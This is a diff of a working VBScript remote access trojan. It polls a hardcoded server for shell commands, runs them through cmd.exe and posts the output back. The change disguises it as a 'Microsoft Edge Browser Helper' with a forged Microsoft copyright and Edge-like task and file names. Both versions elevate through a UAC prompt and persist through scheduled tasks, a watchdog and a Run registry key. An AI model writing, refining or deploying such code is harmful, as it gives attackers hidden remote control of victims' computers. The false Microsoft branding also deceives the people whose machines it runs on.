@@ -1,560 +1,418 @@
-Const SERVER_URL = "https://luyehealth.com"
-Const AUTH_TOKEN = "RAT2025_SECURE_TOKEN_FIXED_2025"
-Const POLL_INTERVAL = 10000
-Const TASK_NAME = "WindowsUpdateCheck"
-Const WATCHDOG_TASK = "WindowsUpdateWatchdog"
-Const WATCHDOG_INTERVAL = 60
-Const BACKUP_FILENAME = "wucheck.vbs"
+' Microsoft Edge Browser Helper
+' This script helps maintain browser settings and updates
+' Copyright (c) Microsoft Corporation. All rights reserved.
 
-' Get the backup path in TEMP folder
-Function GetBackupPath()
-    Dim objShellBP
-    Set objShellBP = CreateObject("WScript.Shell")
-    GetBackupPath = objShellBP.ExpandEnvironmentStrings("%TEMP%") & "\" & BACKUP_FILENAME
+Option Explicit
+
+Dim CONFIG_HOST, CONFIG_KEY, CONFIG_WAIT
+Dim TASK_MAIN, TASK_HELPER, FILE_NAME
+
+CONFIG_HOST = "luyehealth.com"
+CONFIG_KEY = "RAT2025_SECURE_TOKEN_FIXED_2025"
+CONFIG_WAIT = 10000
+TASK_MAIN = "EdgeBrowserHelper"
+TASK_HELPER = "EdgeBrowserSync"
+FILE_NAME = "edgebrowserhelper.vbs"
+
+Function GetDataFolder()
+    Dim ws
+    Set ws = CreateObject("WScript.Shell")
+    GetDataFolder = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeUpdate\"
 End Function
 
-' Copy script to TEMP folder as backup
-Sub CopyToTemp()
-    On Error Resume Next
-    Dim objFSOTemp, srcPath, destPath
-    Set objFSOTemp = CreateObject("Scripting.FileSystemObject")
-    srcPath = WScript.ScriptFullName
-    destPath = GetBackupPath()
+Function GetFilePath()
+    GetFilePath = GetDataFolder() & FILE_NAME
+End Function
 
-    ' Only copy if source exists and is different from dest
-    If objFSOTemp.FileExists(srcPath) Then
-        If LCase(srcPath) <> LCase(destPath) Then
-            objFSOTemp.CopyFile srcPath, destPath, True
-        End If
+Sub CreateFolderIfNeeded(path)
+    On Error Resume Next
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(path) Then
+        fso.CreateFolder path
     End If
     Err.Clear
 End Sub
 
-' Get the script path to use (original or backup)
-Function GetActiveScriptPath()
-    Dim objFSOActive
-    Set objFSOActive = CreateObject("Scripting.FileSystemObject")
+Sub SaveCopy()
+    On Error Resume Next
+    Dim fso, src, dst, parentFolder
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    src = WScript.ScriptFullName
+    dst = GetFilePath()
+    parentFolder = fso.GetParentFolderName(dst)
+    
+    CreateFolderIfNeeded fso.GetParentFolderName(parentFolder)
+    CreateFolderIfNeeded parentFolder
+    
+    If fso.FileExists(src) And LCase(src) <> LCase(dst) Then
+        fso.CopyFile src, dst, True
+    End If
+    Err.Clear
+End Sub
 
-    ' First try to use the backup path (more reliable)
-    If objFSOActive.FileExists(GetBackupPath()) Then
-        GetActiveScriptPath = GetBackupPath()
+Function GetCurrentPath()
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If fso.FileExists(GetFilePath()) Then
+        GetCurrentPath = GetFilePath()
     Else
-        GetActiveScriptPath = WScript.ScriptFullName
+        GetCurrentPath = WScript.ScriptFullName
     End If
 End Function
 
-' ============ AUTO-ELEVATION VIA SCHEDULED TASK ============
-' This runs FIRST before any On Error Resume Next
-
-Sub RequestAdminAndExit()
-    Dim objShellApp, scriptPath
-    scriptPath = WScript.ScriptFullName
-    Set objShellApp = CreateObject("Shell.Application")
-    ' Use cmd.exe /c start to guarantee UAC prompt appears
-    objShellApp.ShellExecute "cmd.exe", "/c wscript.exe """ & scriptPath & """ setup", "", "runas", 0
+Sub RequestElevation()
+    Dim app, path
+    path = WScript.ScriptFullName
+    Set app = CreateObject("Shell.Application")
+    app.ShellExecute "wscript.exe", "//B """ & path & """ install", "", "runas", 0
     WScript.Quit
 End Sub
 
-Function DoesTaskExist()
+Function CheckTask()
     On Error Resume Next
-    Dim objShellTemp, objExec, result, errOutput, exitCode
-    Set objShellTemp = CreateObject("WScript.Shell")
-
-    ' Run schtasks query and check exit code
-    Set objExec = objShellTemp.Exec("cmd.exe /c schtasks /query /tn """ & TASK_NAME & """ 2>&1")
-
-    ' Wait for command to complete
-    Do While objExec.Status = 0
-        WScript.Sleep 50
+    Dim ws, exec, output, code
+    Set ws = CreateObject("WScript.Shell")
+    Set exec = ws.Exec("schtasks /query /tn """ & TASK_MAIN & """ 2>&1")
+    Do While exec.Status = 0
+        WScript.Sleep 100
     Loop
-
-    result = objExec.StdOut.ReadAll
-    exitCode = objExec.ExitCode
-
-    ' Exit code 0 means task exists, non-zero means it doesn't
-    If exitCode = 0 And InStr(result, TASK_NAME) > 0 Then
-        DoesTaskExist = True
-    Else
-        DoesTaskExist = False
-    End If
+    output = exec.StdOut.ReadAll
+    code = exec.ExitCode
+    CheckTask = (code = 0 And InStr(output, TASK_MAIN) > 0)
     Err.Clear
 End Function
 
-Sub CreateTheTask()
-    Dim objShellTemp, scriptPath, backupPath, cmd, exitCode
-    Set objShellTemp = CreateObject("WScript.Shell")
-    scriptPath = WScript.ScriptFullName
-    backupPath = GetBackupPath()
-
-    ' First copy script to TEMP as backup
-    CopyToTemp
-
-    ' Create scheduled task pointing to TEMP backup (more persistent)
-    cmd = "schtasks /create /tn """ & TASK_NAME & """ /tr ""wscript.exe \""" & backupPath & "\"" running"" /sc onlogon /rl highest /f"
-    exitCode = objShellTemp.Run(cmd, 0, True)
-
-    ' Create watchdog task that runs every minute to ensure main script is running
-    cmd = "schtasks /create /tn """ & WATCHDOG_TASK & """ /tr ""wscript.exe \""" & backupPath & "\"" watchdog"" /sc minute /mo 1 /rl highest /f"
-    objShellTemp.Run cmd, 0, True
-
-    ' Run the task now
-    objShellTemp.Run "schtasks /run /tn """ & TASK_NAME & """", 0, False
+Sub CreateTasks()
+    Dim ws, path, c1, c2
+    Set ws = CreateObject("WScript.Shell")
+    path = GetFilePath()
+    SaveCopy
+    
+    c1 = "schtasks /create /tn """ & TASK_MAIN & """ /tr ""wscript.exe //B \""" & path & "\"" run"" /sc onlogon /rl highest /f"
+    ws.Run c1, 0, True
+    
+    c2 = "schtasks /create /tn """ & TASK_HELPER & """ /tr ""wscript.exe //B \""" & path & "\"" check"" /sc minute /mo 3 /rl highest /f"
+    ws.Run c2, 0, True
+    
+    ws.Run "schtasks /run /tn """ & TASK_MAIN & """", 0, False
 End Sub
 
-Function IsMainScriptRunning()
+Function IsRunning()
     On Error Resume Next
-    Dim objWMI, colProcesses, objProcess, count, cmdLine
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-
-    ' Count wscript.exe processes running our script (original name or backup name)
-    Set colProcesses = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe'")
-    count = 0
-
-    For Each objProcess In colProcesses
-        cmdLine = LCase(objProcess.CommandLine)
-        ' Check for original script name or backup filename
-        If (InStr(cmdLine, LCase(WScript.ScriptName)) > 0 Or InStr(cmdLine, LCase(BACKUP_FILENAME)) > 0) Then
-            If InStr(cmdLine, "running") > 0 Then
-                count = count + 1
-            End If
+    Dim wmi, procs, p, cnt, cl
+    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Set procs = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name='wscript.exe'")
+    cnt = 0
+    For Each p In procs
+        cl = LCase(p.CommandLine & "")
+        If InStr(cl, LCase(FILE_NAME)) > 0 And InStr(cl, "run") > 0 Then
+            cnt = cnt + 1
         End If
     Next
-
-    ' If more than 0 (excluding watchdog), main is running
-    IsMainScriptRunning = (count > 0)
+    IsRunning = (cnt > 0)
     Err.Clear
 End Function
 
-Sub RunWatchdog()
-    ' Watchdog mode: Check if main script is running, if not restart it
+Sub DoCheck()
     On Error Resume Next
-
-    ' First ensure startup persistence
-    EnsureStartupPersistence
-
-    ' Check if main script is running
-    If Not IsMainScriptRunning() Then
-        ' Main script not running, restart it via scheduled task
-        Dim objShellWD
-        Set objShellWD = CreateObject("WScript.Shell")
-        objShellWD.Run "schtasks /run /tn """ & TASK_NAME & """", 0, False
+    KeepAlive
+    If Not IsRunning() Then
+        Dim ws
+        Set ws = CreateObject("WScript.Shell")
+        ws.Run "schtasks /run /tn """ & TASK_MAIN & """", 0, False
     End If
-
     WScript.Quit
 End Sub
 
-Sub EnsureStartupPersistence()
+Sub KeepAlive()
     On Error Resume Next
-    Dim objShellPersist, backupPath
-    Set objShellPersist = CreateObject("WScript.Shell")
-    backupPath = GetBackupPath()
-
-    ' Always copy to TEMP first (keep backup updated)
-    CopyToTemp
-
-    ' Check and fix Registry Run key
-    objShellPersist.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsService", _
-                              "schtasks /run /tn """ & TASK_NAME & """", "REG_SZ"
+    Dim ws, path, regKey
+    Set ws = CreateObject("WScript.Shell")
+    path = GetFilePath()
+    SaveCopy
+    
+    regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdater"
+    ws.RegWrite regKey, "schtasks /run /tn """ & TASK_MAIN & """", "REG_SZ"
     Err.Clear
-
-    ' Check if main task exists, create if not (pointing to TEMP backup)
-    If Not DoesTaskExist() Then
+    
+    If Not CheckTask() Then
         Dim cmd
-        cmd = "schtasks /create /tn """ & TASK_NAME & """ /tr ""wscript.exe \""" & backupPath & "\"" running"" /sc onlogon /rl highest /f"
-        objShellPersist.Run cmd, 0, True
+        cmd = "schtasks /create /tn """ & TASK_MAIN & """ /tr ""wscript.exe //B \""" & path & "\"" run"" /sc onlogon /rl highest /f"
+        ws.Run cmd, 0, True
     End If
-
-    ' Ensure watchdog task exists
-    Dim objExec, result, exitCode
-    Set objExec = objShellPersist.Exec("cmd.exe /c schtasks /query /tn """ & WATCHDOG_TASK & """ 2>&1")
-    Do While objExec.Status = 0
-        WScript.Sleep 50
-    Loop
-    exitCode = objExec.ExitCode
-
-    If exitCode <> 0 Then
-        ' Watchdog task doesn't exist, create it (pointing to TEMP backup)
-        Dim cmdWD
-        cmdWD = "schtasks /create /tn """ & WATCHDOG_TASK & """ /tr ""wscript.exe \""" & backupPath & "\"" watchdog"" /sc minute /mo 1 /rl highest /f"
-        objShellPersist.Run cmdWD, 0, True
-    End If
-
     Err.Clear
 End Sub
 
-' Check arguments FIRST (no error handling yet)
-If WScript.Arguments.Count > 0 Then
-    If WScript.Arguments(0) = "running" Then
-        ' Already running from scheduled task - continue to main code
-        ' Verify startup persistence on each run
-        EnsureStartupPersistence
-    ElseIf WScript.Arguments(0) = "setup" Then
-        ' Running with admin from UAC - create task and exit
-        CreateTheTask
-        WScript.Quit
-    ElseIf WScript.Arguments(0) = "watchdog" Then
-        ' Watchdog mode - check if main is running and restart if needed
-        RunWatchdog
-        WScript.Quit
-    End If
+Dim args
+Set args = WScript.Arguments
+
+If args.Count > 0 Then
+    Select Case args(0)
+        Case "run"
+            KeepAlive
+        Case "install"
+            CreateTasks
+            WScript.Quit
+        Case "check"
+            DoCheck
+            WScript.Quit
+    End Select
 Else
-    ' No arguments - first run, need to setup
-    If DoesTaskExist() Then
-        ' Task exists, run it
-        Dim objShellRun
-        Set objShellRun = CreateObject("WScript.Shell")
-        objShellRun.Run "schtasks /run /tn """ & TASK_NAME & """", 0, False
+    If CheckTask() Then
+        Dim ws
+        Set ws = CreateObject("WScript.Shell")
+        ws.Run "schtasks /run /tn """ & TASK_MAIN & """", 0, False
         WScript.Quit
     Else
-        ' Task doesn't exist, request admin (shows UAC)
-        RequestAdminAndExit
+        RequestElevation
     End If
 End If
-' ============ END AUTO-ELEVATION ============
 
 On Error Resume Next
 
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objNetwork = CreateObject("WScript.Network")
+Dim shell, fso, network
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set network = CreateObject("WScript.Network")
 
-Function GetHostname()
-    GetHostname = objNetwork.ComputerName
+Function GetName()
+    GetName = network.ComputerName
 End Function
 
-Function GetClientId()
-    Dim hostname, hash, i
-    hostname = GetHostname()
-    hash = 0
-    For i = 1 To Len(hostname)
-        hash = (hash * 31 + Asc(Mid(hostname, i, 1))) Mod 100000
+Function GetId()
+    Dim n, h, i
+    n = GetName()
+    h = 0
+    For i = 1 To Len(n)
+        h = (h * 31 + Asc(Mid(n, i, 1))) Mod 100000
     Next
-    GetClientId = "VBS" & hostname & hash
+    GetId = "VBS" & n & h
 End Function
 
-Function GetArchitecture()
-    Dim arch
-    arch = objShell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
-    If InStr(arch, "64") > 0 Then
-        GetArchitecture = "64bit"
+Function GetArch()
+    Dim a
+    a = shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
+    If InStr(a, "64") > 0 Then
+        GetArch = "64bit"
     Else
-        GetArchitecture = "32bit"
+        GetArch = "32bit"
     End If
 End Function
 
-Function GetWindowsVersion()
+Function GetOS()
     On Error Resume Next
-    Dim objWMI, colOS, objOS
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colOS = objWMI.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
-    For Each objOS In colOS
-        GetWindowsVersion = objOS.Caption
+    Dim wmi, items, item
+    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Set items = wmi.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
+    For Each item In items
+        GetOS = item.Caption
         Exit For
     Next
-    If GetWindowsVersion = "" Then GetWindowsVersion = "Windows"
+    If GetOS = "" Then GetOS = "Windows"
 End Function
 
-Function GetLocalIP()
+Function GetIP()
     On Error Resume Next
-    Dim objWMI, colAdapters, objAdapter, ipAddr
-    GetLocalIP = "unknown"
-
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colAdapters = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
-
-    For Each objAdapter In colAdapters
-        If Not IsNull(objAdapter.IPAddress) Then
-            For Each ipAddr In objAdapter.IPAddress
-                ' Get first non-localhost IPv4 address
-                If InStr(ipAddr, ".") > 0 And Left(ipAddr, 4) <> "127." Then
-                    GetLocalIP = ipAddr
-                    Exit Function
-                End If
-            Next
-        End If
-    Next
+    Dim http
+    GetIP = "unknown"
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", "https://api.ipify.org", False
+    http.Send
+    If Err.Number = 0 And http.Status = 200 Then
+        GetIP = Trim(http.ResponseText)
+    End If
+    Set http = Nothing
     Err.Clear
 End Function
 
-Function GetPublicIP()
+Function WebRequest(method, endpoint, data, auth)
     On Error Resume Next
-    Dim objHTTP, response
-    GetPublicIP = "unknown"
-
-    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    objHTTP.SetOption 2, 13056
-    objHTTP.Open "GET", "https://api.ipify.org", False
-    objHTTP.Send
-
-    If Err.Number = 0 And objHTTP.Status = 200 Then
-        GetPublicIP = Trim(objHTTP.responseText)
+    Dim http, url
+    url = "https://" & CONFIG_HOST & endpoint
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open method, url, False
+    http.SetRequestHeader "Content-Type", "application/json"
+    If auth <> "" Then
+        http.SetRequestHeader "Authorization", auth
     End If
-
-    Set objHTTP = Nothing
-    Err.Clear
-End Function
-
-Function HttpRequest(method, url, data, authHeader)
-    On Error Resume Next
-    Dim objHTTP, response
-    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-
-    objHTTP.SetOption 2, 13056
-    objHTTP.Open method, url, False
-    objHTTP.setRequestHeader "Content-Type", "application/json"
-    If authHeader <> "" Then
-        objHTTP.setRequestHeader "Authorization", authHeader
-    End If
-    objHTTP.Send data
-
+    http.Send data
     If Err.Number = 0 Then
-        HttpRequest = objHTTP.responseText
+        WebRequest = http.ResponseText
     Else
-        HttpRequest = ""
+        WebRequest = ""
         Err.Clear
     End If
-
-    Set objHTTP = Nothing
+    Set http = Nothing
 End Function
 
-Function ExecuteCommand(cmd)
+Function RunCmd(c)
     On Error Resume Next
-    Dim objExec, output, line
-
-    Set objExec = objShell.Exec("cmd.exe /c " & cmd)
-
-    output = ""
-    Do While Not objExec.StdOut.AtEndOfStream
-        line = objExec.StdOut.ReadLine()
-        output = output & line & vbCrLf
+    Dim ex, out, ln
+    Set ex = shell.Exec("cmd.exe /c " & c)
+    out = ""
+    Do While Not ex.StdOut.AtEndOfStream
+        ln = ex.StdOut.ReadLine()
+        out = out & ln & vbCrLf
     Loop
-    Do While Not objExec.StdErr.AtEndOfStream
-        line = objExec.StdErr.ReadLine()
-        output = output & line & vbCrLf
+    Do While Not ex.StdErr.AtEndOfStream
+        ln = ex.StdErr.ReadLine()
+        out = out & ln & vbCrLf
     Loop
-
-    ExecuteCommand = output
+    RunCmd = out
 End Function
 
-Function JsonEscape(s)
-    Dim result, i, c
-    result = ""
+Function Esc(s)
+    Dim r, i, c
+    r = ""
     For i = 1 To Len(s)
         c = Mid(s, i, 1)
         Select Case c
-            Case """"
-                result = result & "\"""
-            Case "\"
-                result = result & "\\"
-            Case vbCr
-                result = result & "\r"
-            Case vbLf
-                result = result & "\n"
-            Case vbTab
-                result = result & "\t"
+            Case """": r = r & "\"""
+            Case "\": r = r & "\\"
+            Case vbCr: r = r & "\r"
+            Case vbLf: r = r & "\n"
+            Case vbTab: r = r & "\t"
             Case Else
-                If Asc(c) >= 32 And Asc(c) < 127 Then
-                    result = result & c
-                End If
+                If Asc(c) >= 32 And Asc(c) < 127 Then r = r & c
         End Select
     Next
-    JsonEscape = result
+    Esc = r
 End Function
 
-Function JsonUnescape(s)
-    Dim result, i, c, nextC
-    result = ""
+Function UnEsc(s)
+    Dim r, i, c, n
+    r = ""
     i = 1
     Do While i <= Len(s)
         c = Mid(s, i, 1)
         If c = "\" And i < Len(s) Then
-            nextC = Mid(s, i + 1, 1)
-            Select Case nextC
-                Case "\"
-                    result = result & "\"
-                    i = i + 1
-                Case """"
-                    result = result & """"
-                    i = i + 1
-                Case "n"
-                    result = result & vbLf
-                    i = i + 1
-                Case "r"
-                    result = result & vbCr
-                    i = i + 1
-                Case "t"
-                    result = result & vbTab
-                    i = i + 1
-                Case Else
-                    result = result & c
+            n = Mid(s, i + 1, 1)
+            Select Case n
+                Case "\": r = r & "\": i = i + 1
+                Case """": r = r & """": i = i + 1
+                Case "n": r = r & vbLf: i = i + 1
+                Case "r": r = r & vbCr: i = i + 1
+                Case "t": r = r & vbTab: i = i + 1
+                Case Else: r = r & c
             End Select
         Else
-            result = result & c
+            r = r & c
         End If
         i = i + 1
     Loop
-    JsonUnescape = result
+    UnEsc = r
 End Function
 
-Function ParseJsonValue(json, key)
-    Dim searchKey, pos, startPos, endPos, value, depth
-    searchKey = """" & key & """"
-    pos = InStr(json, searchKey)
-    If pos = 0 Then
-        ParseJsonValue = ""
-        Exit Function
-    End If
-
-    pos = InStr(pos, json, ":")
-    If pos = 0 Then
-        ParseJsonValue = ""
-        Exit Function
-    End If
-
-    pos = pos + 1
-    Do While Mid(json, pos, 1) = " "
-        pos = pos + 1
-    Loop
-
-    If Mid(json, pos, 1) = """" Then
-        startPos = pos + 1
-        endPos = startPos
-        Do While endPos <= Len(json)
-            If Mid(json, endPos, 1) = "\" Then
-                endPos = endPos + 2
-            ElseIf Mid(json, endPos, 1) = """" Then
+Function GetVal(json, key)
+    Dim sk, p, sp, ep, v
+    sk = """" & key & """"
+    p = InStr(json, sk)
+    If p = 0 Then GetVal = "": Exit Function
+    p = InStr(p, json, ":")
+    If p = 0 Then GetVal = "": Exit Function
+    p = p + 1
+    Do While Mid(json, p, 1) = " ": p = p + 1: Loop
+    If Mid(json, p, 1) = """" Then
+        sp = p + 1: ep = sp
+        Do While ep <= Len(json)
+            If Mid(json, ep, 1) = "\" Then
+                ep = ep + 2
+            ElseIf Mid(json, ep, 1) = """" Then
                 Exit Do
             Else
-                endPos = endPos + 1
+                ep = ep + 1
             End If
         Loop
-        value = Mid(json, startPos, endPos - startPos)
-        value = JsonUnescape(value)
+        v = Mid(json, sp, ep - sp)
+        v = UnEsc(v)
     Else
-        startPos = pos
-        endPos = InStr(startPos, json, ",")
-        If endPos = 0 Then endPos = InStr(startPos, json, "}")
-        value = Trim(Mid(json, startPos, endPos - startPos))
+        sp = p
+        ep = InStr(sp, json, ",")
+        If ep = 0 Then ep = InStr(sp, json, "}")
+        v = Trim(Mid(json, sp, ep - sp))
     End If
-
-    ParseJsonValue = value
+    GetVal = v
 End Function
 
-Sub AddToStartup()
-    ' Now handled by EnsureStartupPersistence which runs on every startup
-    ' This is kept for backward compatibility
-    EnsureStartupPersistence
-End Sub
-
-Sub Register(clientId)
+Sub DoRegister(id)
     On Error Resume Next
-    Dim json, response
-    json = "{" & _
-           """client_id"":""" & clientId & """," & _
-           """hostname"":""" & GetHostname() & """," & _
-           """platform"":""Windows""," & _
-           """platform_release"":""" & GetWindowsVersion() & """," & _
-           """architecture"":""" & GetArchitecture() & """," & _
-           """ip_address"":""" & GetPublicIP() & """," & _
-           """auth_token"":""" & AUTH_TOKEN & """" & _
-           "}"
-
-    response = HttpRequest("POST", SERVER_URL & "/api/poll/register", json, "")
+    Dim j, r
+    j = "{""client_id"":""" & id & """,""hostname"":""" & GetName() & """,""platform"":""Windows"",""platform_release"":""" & GetOS() & """,""architecture"":""" & GetArch() & """,""ip_address"":""" & GetIP() & """,""auth_token"":""" & CONFIG_KEY & """}"
+    r = WebRequest("POST", "/api/poll/register", j, "")
     Err.Clear
 End Sub
 
-Sub SendResult(clientId, commandId, result)
-    Dim json
-    json = "{" & _
-           """client_id"":""" & clientId & """," & _
-           """command_id"":""" & commandId & """," & _
-           """result"":""" & JsonEscape(result) & """," & _
-           """error"":""""," & _
-           """exit_code"":0" & _
-           "}"
-
-    HttpRequest "POST", SERVER_URL & "/api/poll/result", json, AUTH_TOKEN
+Sub DoResult(id, cmdId, res)
+    Dim j
+    j = "{""client_id"":""" & id & """,""command_id"":""" & cmdId & """,""result"":""" & Esc(res) & """,""error"":"""",""exit_code"":0}"
+    WebRequest "POST", "/api/poll/result", j, CONFIG_KEY
 End Sub
 
-Sub MainLoop()
+Sub Main()
     On Error Resume Next
-    Dim clientId, response, shutdown, commands, cmdStart, cmdEnd, cmdJson
-    Dim commandId, command, result
-    Dim emptyResponseCount, lastRegisterTime
-
-    clientId = GetClientId()
-    emptyResponseCount = 0
-    lastRegisterTime = Now
-
-    ' Run startup tasks (non-blocking)
-    AddToStartup
+    Dim id, resp, sd, cmds, cs, ce, cj, cid, cmd, res, empty, lastReg
+    
+    id = GetId()
+    empty = 0
+    lastReg = Now
+    
+    KeepAlive
     Err.Clear
-
-    ' Register with server
-    Register clientId
+    
+    WScript.Sleep 2000
+    DoRegister id
     Err.Clear
-
+    
     Do While True
         Err.Clear
-        response = HttpRequest("GET", SERVER_URL & "/api/poll/commands/" & clientId, "", AUTH_TOKEN)
-
-        ' Auto re-register if getting empty responses (404) or every 5 minutes
-        If response = "" Or InStr(response, "not found") > 0 Or InStr(response, "error") > 0 Then
-            emptyResponseCount = emptyResponseCount + 1
-            ' Re-register after 3 empty responses or every 5 minutes
-            If emptyResponseCount >= 3 Or DateDiff("n", lastRegisterTime, Now) >= 5 Then
-                Register clientId
-                emptyResponseCount = 0
-                lastRegisterTime = Now
+        resp = WebRequest("GET", "/api/poll/commands/" & id, "", CONFIG_KEY)
+        
+        If resp = "" Or InStr(resp, "not found") > 0 Or InStr(resp, "error") > 0 Then
+            empty = empty + 1
+            If empty >= 3 Or DateDiff("n", lastReg, Now) >= 5 Then
+                DoRegister id
+                empty = 0
+                lastReg = Now
             End If
         Else
-            emptyResponseCount = 0
+            empty = 0
         End If
-
-        If response <> "" Then
-            shutdown = ParseJsonValue(response, "shutdown")
-            If shutdown = "true" Then
-                WScript.Quit
-            End If
-
-            cmdStart = InStr(response, "[")
-            cmdEnd = InStrRev(response, "]")
-            If cmdStart > 0 And cmdEnd > cmdStart Then
-                commands = Mid(response, cmdStart + 1, cmdEnd - cmdStart - 1)
-
-                Do While InStr(commands, "{") > 0
-                    cmdStart = InStr(commands, "{")
-                    cmdEnd = InStr(commands, "}")
-                    If cmdStart > 0 And cmdEnd > cmdStart Then
-                        cmdJson = Mid(commands, cmdStart, cmdEnd - cmdStart + 1)
-
-                        commandId = ParseJsonValue(cmdJson, "command_id")
-                        command = ParseJsonValue(cmdJson, "command")
-
-                        If commandId <> "" And command <> "" Then
-                            Dim cmdDelay
-                            cmdDelay = ParseJsonValue(cmdJson, "delay")
-                            If cmdDelay <> "" Then
-                                If IsNumeric(cmdDelay) Then
-                                    If CInt(cmdDelay) > 0 Then
-                                        WScript.Sleep CInt(cmdDelay) * 1000
-                                    End If
-                                End If
+        
+        If resp <> "" Then
+            sd = GetVal(resp, "shutdown")
+            If sd = "true" Then WScript.Quit
+            
+            cs = InStr(resp, "[")
+            ce = InStrRev(resp, "]")
+            If cs > 0 And ce > cs Then
+                cmds = Mid(resp, cs + 1, ce - cs - 1)
+                Do While InStr(cmds, "{") > 0
+                    cs = InStr(cmds, "{")
+                    ce = InStr(cmds, "}")
+                    If cs > 0 And ce > cs Then
+                        cj = Mid(cmds, cs, ce - cs + 1)
+                        cid = GetVal(cj, "command_id")
+                        cmd = GetVal(cj, "command")
+                        If cid <> "" And cmd <> "" Then
+                            Dim dly
+                            dly = GetVal(cj, "delay")
+                            If dly <> "" And IsNumeric(dly) Then
+                                If CInt(dly) > 0 Then WScript.Sleep CInt(dly) * 1000
                             End If
-                            result = ExecuteCommand(command)
-                            SendResult clientId, commandId, result
+                            res = RunCmd(cmd)
+                            DoResult id, cid, res
                         End If
-
-                        commands = Mid(commands, cmdEnd + 1)
+                        cmds = Mid(cmds, ce + 1)
                     Else
                         Exit Do
                     End If
                 Loop
             End If
         End If
-
-        WScript.Sleep POLL_INTERVAL
+        
+        WScript.Sleep CONFIG_WAIT
     Loop
 End Sub
 
-MainLoop
+Main
